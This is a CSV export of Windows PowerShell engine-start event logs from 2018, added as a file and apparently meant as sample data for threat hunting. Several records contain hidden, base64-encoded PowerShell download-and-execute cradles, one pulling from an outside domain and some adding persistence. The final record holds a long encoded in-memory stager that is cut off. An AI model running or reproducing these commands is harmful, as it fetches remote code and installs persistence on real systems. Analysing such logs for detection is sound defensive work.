@@ -1,0 +1,2211 @@
+"TimeCreated","Details","EventID"
+"9/6/2018 11:20:19 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=11020f84-5c63-402f-8eff-299ecdde31d7
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=fd302d68-58aa-47b0-9e5d-e132b6bbd0b0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/6/2018 10:31:01 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=d0bdac4b-d6a1-42f1-a8a0-bb88b570151a
+	HostApplication=c:\windows\syswow64\windowspowershell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=4fe8ce7b-f0da-4253-a22c-8e8aa1ea2c81
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/6/2018 10:31:00 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=b0503f5c-bd85-48fb-aa42-4cb29bc413b6
+	HostApplication=powershell -W Hidden -nop -noni -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA
+	EngineVersion=5.1.16299.547
+	RunspaceId=597192c2-24af-4041-87d0-cea89fa5bd46
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/6/2018 10:30:08 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=5480a35d-d000-46d4-a994-d46aae0656a9
+	HostApplication=c:\windows\syswow64\windowspowershell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=be1c4add-6f80-4fb7-9b1f-0383d9728cfb
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/6/2018 10:30:02 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=c913700e-4eee-40ed-8f62-64ee3d8719c7
+	HostApplication=powershell -W Hidden -nop -noni -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA
+	EngineVersion=5.1.16299.547
+	RunspaceId=7ed97daa-7ea5-45b4-8c97-378d5d6b3d66
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/6/2018 7:26:32 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=ConsoleHost
+	HostVersion=1.0
+	HostId=ac974e29-6dff-45d1-a025-be7b47d54066
+	HostApplication=C:\WINDOWS\system32\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=b13bf80c-a30f-4295-87c8-dc7659c82e2e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/6/2018 4:58:42 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=ConsoleHost
+	HostVersion=1.0
+	HostId=ef6cd434-cedc-4962-af75-a7679eac5567
+	HostApplication=C:\WINDOWS\system32\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=ec0f0c1b-9fe9-4adf-8217-00e5ffc4a08b
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/6/2018 3:40:37 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=be5b2c2e-be18-47bc-81f0-35a1afaf7228
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=437c9179-6d27-4d76-b3bd-98c585ebf496
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/6/2018 3:09:13 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=bf64d975-c396-48e4-b9b0-36b1e6b773ea
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=72099b4b-9acf-4cde-af39-f2ec920c98a9
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/5/2018 3:38:47 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=d447fcab-e591-4893-9b5a-fa85294cc14e
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=23aec0c7-256e-4f67-85fd-9c39f894aec5
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/5/2018 3:36:11 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=f7b49f17-53e8-4e68-ad14-8b536335e8e9
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=7869143d-e04d-44aa-b372-9062acc41c75
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/5/2018 2:18:02 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=44c248db-5a09-40ed-aeb8-d52decf35534
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=ae0cdb2a-d43e-4048-9074-e7c563f3ebd2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/5/2018 2:04:21 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=1d3b032d-5f20-4776-b135-f7ad4123c73c
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=36d05217-4cfe-450e-bb99-9e7b83db2277
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/5/2018 2:01:36 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=34
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=7861ba34-ba53-45f5-9e10-a912e0a8f3dc
+	HostApplication=C:\WINDOWS\system32\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=9760c4c4-0070-483c-8bf4-10222e975fb4
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/5/2018 2:01:36 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=ConsoleHost
+	HostVersion=1.0
+	HostId=2787da92-cd98-4062-a3e8-8f8a4d766b49
+	HostApplication=C:\WINDOWS\system32\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=b0bc5e93-a54f-41d1-8aa1-9d16e3c296b9
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/5/2018 12:04:21 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=f054ae63-048f-42d0-862a-ff36da0eb4c6
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=1b7c833d-5705-45ce-af87-c64eb29441c6
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/5/2018 12:03:06 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=84b79ac0-faed-4e92-a0d8-4d5d0b43b648
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=82476314-0d1e-4487-88bb-dcc1fff86238
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/3/2018 3:44:21 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=4cc2edb4-41e1-4dac-a22f-f9bbfd2d5f6c
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=67b8d014-323a-4526-ac56-f535ac9de06a
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/3/2018 3:41:42 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=908a819d-2504-472d-9a24-f1c570b346b2
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=06b0ba06-3264-4171-92c5-c302e6a79d4a
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/1/2018 7:41:13 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=4b345c7c-892a-4b42-8dc1-10d8d2ff98d2
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=8eb3f19e-9e88-470a-8387-371db03f8a6d
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"9/1/2018 7:25:07 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=d30b5c07-b707-4c04-8ca0-2ec576200199
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=5bd91e93-290f-46a0-8b26-dd8d15177535
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/31/2018 8:08:18 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=a351092b-d2fc-45c5-9208-65bb99615142
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=d2cb2c1c-14cc-43f2-8fa5-e46bb9bf8415
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/31/2018 6:01:51 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=9d7fedd8-e1e2-47a7-bf05-a1d778d184ad
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=9e2b4683-13a8-4a77-95d6-7cf898652b24
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/31/2018 3:31:23 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=1d0dbb4e-2505-44ea-9830-9ff8ba056940
+	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADUAOQA5ADUANQAvACcAKQApAA==
+	EngineVersion=5.1.16299.547
+	RunspaceId=d45455b4-979f-4187-adb0-fa56e0688fb8
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/31/2018 3:23:23 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=1dbda3f5-fab4-4a4b-b3c8-a0479fa6d937
+	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADIAMwA5ADkAMwAvACcAKQApAA==
+	EngineVersion=5.1.16299.547
+	RunspaceId=9566b5c9-a1de-4b1f-b111-873a77dbbfe8
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/31/2018 3:14:43 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=f8da00fd-8121-4cbe-a375-b81031daee00
+	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADMAMgA4ADYANQAvACcAKQApAA==
+	EngineVersion=5.1.16299.547
+	RunspaceId=e38db2e4-a3ef-4666-949d-f9701cc1713a
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/31/2018 2:55:19 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=5ba41c00-6cd0-497f-acb1-8fb3041cda00
+	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADEAOAA0ADYANAAvACcAKQApAA==
+	EngineVersion=5.1.16299.547
+	RunspaceId=b809ce77-6b7b-47e3-939d-820897e7184c
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/31/2018 2:08:47 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=e35d6055-a1e5-4c0f-812c-bd985d4e209e
+	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADQANQA1ADQAOAAvACcAKQApAA==
+	EngineVersion=5.1.16299.547
+	RunspaceId=7b2b13dc-496e-47c1-b58f-a24203c3fd52
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/31/2018 2:06:56 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=0e07f97e-96aa-4a3b-8f59-34b49b201104
+	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADQAMQA2ADEANAAvACcAKQApAA==
+	EngineVersion=5.1.16299.547
+	RunspaceId=db7d2211-c023-49c2-8021-379649a9cfd2
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/31/2018 12:45:27 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=b8c18767-c4f2-42e1-ba6a-042f782f0c76
+	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADQAMwAxADQAMwAvACcAKQApAA==
+	EngineVersion=5.1.16299.547
+	RunspaceId=c6c7e4e2-bbaa-41a6-9e9f-6be2187e7e2b
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/30/2018 11:40:50 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=47
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=708cae89-9d61-4626-b8ec-bc0d705c1c9f
+	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=6ba88dc3-c56d-43b5-a95e-b4fae177ab6e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/30/2018 11:40:43 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=ConsoleHost
+	HostVersion=1.0
+	HostId=9da4ff8d-a65e-4c7f-b24d-9798d2be3800
+	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=c4be820a-eea8-4967-b91c-f7308eb6de21
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/30/2018 11:40:20 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=ConsoleHost
+	HostVersion=1.0
+	HostId=88366754-b751-448c-92e0-59140a7e9025
+	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=be1daed9-4950-4cd4-8bb8-62e67809d833
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/30/2018 8:31:17 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=e3276eb3-8d52-42e5-80fc-4ac9701ddfe4
+	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA0ADAAOQAyAC8AJwApADsAIABjAGgAZQBjAGsALQBXAE0ASQA=
+	EngineVersion=5.1.16299.547
+	RunspaceId=380d114b-6db5-4422-b414-cc2cc323d57b
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/30/2018 8:31:07 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=421ce163-4e1f-48ec-a651-f3147d416be2
+	HostApplication=powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA1ADQANwAwADkALwAnACkAOwAgAEkAbgBzAHQAYQBsAGwALQBQAGUAcgBzAGkAcwB0AGUAbgBjAGUA
+	EngineVersion=5.1.16299.547
+	RunspaceId=8387832f-b2e3-40df-ad79-6f8644ce35c4
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/30/2018 6:43:47 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=2c5d70b2-85e5-420a-b123-132832a0170b
+	HostApplication=c:\windows\syswow64\windowspowershell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=1829ae3b-0b79-4ce8-a050-2681be37252b
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/30/2018 6:43:39 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=d4d5c9f4-3492-44b2-895f-e27eb9a94cc4
+	HostApplication=powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABhADIALwBpAFMAaABMADkASABIADYARgBQADAAUQBDAEYATQBMAFQAQQBUAEwAUwBTAEcATQBiAEQATwBZAE4AeABnAGEAUwBHADAAVwBOADMAWgBpAEcAOQBpAE4AMgAyAHcAYgB1AHoASAAvAGYAcwBvAEgAYwB6AEUANQBtAGQANgBSAGQASgBJAHQAMgB1ADYAcgA2ADkASwBuAFQANQBiAEsASwAyAGIAMwBLAGYARwBLAHcAbwBXAHQAaQA3AGwANwBIAGYAawBCAGMAaAA2AHQAbQBNAHIAYwB0AFYAMgBIAGMAVgArADUAYgBOAHIATQBKAEgAWQBNAGwAMAA4AG4AZwAxAGMATABzADEAZgBOAGQANAB4AFcAWgBwAG8AKwBEAGcAUABzADcAYwB6AE4AQgBQAHIASwA1ADMARwAyAEUALwBGAGYAYgBOAFUATwBLAEMAMQB4ADYAawB4AGgAaQBNAC8AUgB4AC8AdQBZAG0AYwA1AE4ATwBoAFUANgBBAE4AdgBqAFYAUQBZAHgARQArAE4AWABHAGIATwB1AGEAQQBTAHkAVQBlAHgAWQA4AHIAKwBYAGEAaQBEAGcAdgBYADcANQBJAG8AZQA5AGoAaAA1ADMAdgBpAHgAMwBNAGgAQwBEAEEAOQBwAG8AUwBIAE8AVAB5ADMASABkAHUAcwBjAFUAKwB2AGgAKwB2AGQAOQBoAGcAMwBOAC8AYwA3AFcAdQB4AFEAOQAwADEAbwBoAGUAegBvADQAUwBNAEwAVwB4AEkAYwBNAHoAawAyAGMAQQAxAFUATABLAEQAbwB1AHAAUgB3AG4ATABaAHYALwA3AEsANQBwAC8AdgBLAHkALwBGADkAbAB1AEkAYQBKAEQATABxAHMAZQBBAFkAYgB0AG8AVQBwAHIATgBjAHoALwB5AHkAWQBMAHoAbwA0AGQAegAyAFMARQB4AGYARABkAHcATgA2AHkANABJAEUANgB0AFcAdABSAFMAOQBLAE0AVQAvAFAAQwBNAFAAWgB1AC8ANwBNAHoAeQBFAE8AegBqADkANQB0AE0AbwBwADUAOQBjAGwAawBZAFQAbwBBAGIANABjAHgAaAB0AHMAQQA5AEoAKwBzADkAdgA3AHgAdwAzADkANwBSAHoARQBLAEgARQBSAHMAWABGAFkAZABoADMALwBWAFUANwBFAGYARQB3AEUARwB4AGkAeAB5AFQANABoAG4AZQBnAEYAcwAyAGcAUABRADUAVgBqAFkAUABJAEgAegBNAFEAdAAvAGgAcgBsAGoAQQBMADMATAAzAE8ASABmAHIAaABKAFEAVwBJAE8ANwB6AG4AOABaADkAeQBZADEAdwBmAEMAWAAzAFQANQAxAHkASAA1ADMAQQBhAHMATAA4AGYATwBHAGkAaQBUACsAaABZADUAagBxADUAaAB3AE8AdAB2AE0ATAArAGcALwBpAHkAcwBQAHYARgA0AEgAbABNAHoAOAB5AG4AMABqAFYAeABCAFIAYgBpAE8ARgBYAEIAdgB4ACsAMABHAHIAbQA1AHUAWQA1AEgAVwBMAFkAVAAyADcAaQBCAGkAVAAxACsAOABxAFYAQwA5AHcAUQBRAEMARABtACsAcwBjAGsAbgBYAE0ALwB4AFAAbQBYAGYALwBKAHoAWAB2AGIAcQBHAFIAUgArAEcANgBoAHkAOQBiAHIANABuAE4ATgB6AHgAdgBHAFYAZQA5AFoAZABZAHIANQBrAGIAdgBLAFoAaQAzAHEAUwArAGQAZAAxAFMASwBpAEoALwBlAFQANQA3ADAAOQBEAEMAMgArAEkAZwAxAHQASABCADkAbgBFAHUAQQBvACsAOQAxAG4ATwA4AEkAYgBpAGwASQAvAGkAMQBXAHcARQBPAEgAUABaAHkAdwBOAHMAdABpADcAcwBaAEIATgBDAG4AMwA5ADEAYQA5AHUARQB2AGYAdQBLAFoAMwBDAEMAQQBYAGsAUABBAEIAVgBJAEkAdgA4AHoAbQBIAE0ATwBjADEAbgBGAEcAVwBJAGIAKwBEAHYAZgBnADAAeAB2AE4AMwBEAE0AOABOAFgANgBjAHIAUwBPADEAOQBXAFQAKwAwAFQATABFAGsAVgBCAFUATwBBAG0ASQBaAHgAegBvADgAQwBwAEcARgBGAHMARgBqAGoAQgBDAGMAagBsAGsAUgBBAHkATgB4ADEAbQAvADQARQA3AEQAQwBrAGoAQgBnAHIAWQBOAGQAeABMAC8AaABOAEsATAAwAHQATAByAGcATQBuAEoAagBRAGcAdQAwAEQARABYAFAAVwB3AFEAUgBCAE4AVwBDAGwAdwBYAFcASgBpADgAYQBnAFMANgB3AG8AaAArAHkAawBuAEUAcQBJAFUAagBoAHgARQBpAGkAQQBuAE0ASgBOAHcAbwBiAEoARQBNADcANQBaACsASABkADkANQBJAHMAcQBaAG8AcgB0AFUAVwB5AEQAZABWAHEARgBaAEkAbwBzAHEARABtAFgARQA1AFgASwBEAFYAbgBZAHoAUAA0AEgAMgBOAGQAegBjAGoANABVAEMAVgBkAFgAawBqADYAQQBCAGcARwBvADEARwBVAEYAVABpAGMAKwBnADcAcQBXAEwAZgB3AGkAdgBQADgATgAzAHMAOABsADUAaQBlAFkAawBvADgAdgBpAGMAeQBsAEIALwBGAFoAUABMAEwAawB1AEsAUwBXAFIAdgBKAHkAKwBmAHIATwBaAGMAcQBjAHoANABBADEAMgBYAGQAdABFAFEAVwA0AHoAcQB0AHAARwBjAHQAbABTADIAUABTAEUAKwBDADMAVQBoAHcANgBOAEgAdAA3AFUAbABGAGkAdQBJAFoAdwBhAGEAUwBtAHUASwAyAEcAMgBlAC8AdAB1AHEAVwBoAEkAUQBXAFQAagB0AHcAVQBTAEcAegBGAFIAbgBNAGsARwBCAHYAUwBsAEgAdABMAHMASgB1AFMAcwB0AEkAVQBUAEcAawB3ADcAUgBJADUANwBzADcANgBnA